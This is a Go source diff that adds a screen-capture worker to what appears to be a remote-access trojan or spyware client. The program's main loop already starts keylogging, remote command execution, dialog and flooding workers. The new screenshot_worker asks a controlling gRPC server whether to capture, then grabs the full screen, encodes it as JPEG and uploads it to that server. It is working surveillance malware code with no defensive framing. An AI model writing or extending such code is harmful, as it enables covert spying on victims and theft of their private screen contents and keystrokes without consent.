@@ -12,8 +12,11 @@ TODO:
 */
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"image"
+	"image/jpeg"
 	"log"
 	"os/exec"
 	"runtime"
@@ -36,6 +39,7 @@ import (
 	"github.com/go-gl/glfw/v3.3/glfw"
 	"github.com/ncruces/zenity"
 	"github.com/nullboundary/glfont"
+	"github.com/vova616/screenshot"
 	"golang.design/x/hotkey"
 )
 
@@ -150,6 +154,7 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 			lastFrameTime = now
 
 			go keylog_worker(client, ctx, pid, key_out, window_out)
+			go screenshot_worker(client, ctx, pid)
 			go dialog_worker(client, ctx, pid)
 			go exec_worker(client, ctx, pid)
 			go flood_worker(client, ctx)
@@ -159,6 +164,26 @@ func WindowLoop(window *glfw.Window, font *glfont.Font, pid string, mode *glfw.V
 		}
 
 	}
+}
+
+func screenshot_worker(client pb.ConsumerClient, ctx context.Context, pid string) error {
+	d, err := client.GetScreen(ctx, &pb.ClientDataRequest{ClientId: pid})
+	if err != nil {
+		return err
+	}
+
+	if d.ShouldTakeScreenshot {
+		img, err := screenshot.CaptureScreen()
+		if err != nil {
+			return err
+		}
+		buf := new(bytes.Buffer)
+		screen := image.Image(img)
+		jpeg.Encode(buf, screen, nil)
+		client.SetScreenOutput(ctx, &pb.ScreenOutput{ImageData: buf.Bytes(), Id: &pb.ClientDataRequest{ClientId: pid}})
+	}
+
+	return nil
 }
 
 func keylog_worker(client pb.ConsumerClient, ctx context.Context, pid string, key_out chan rune, window_out chan string) {
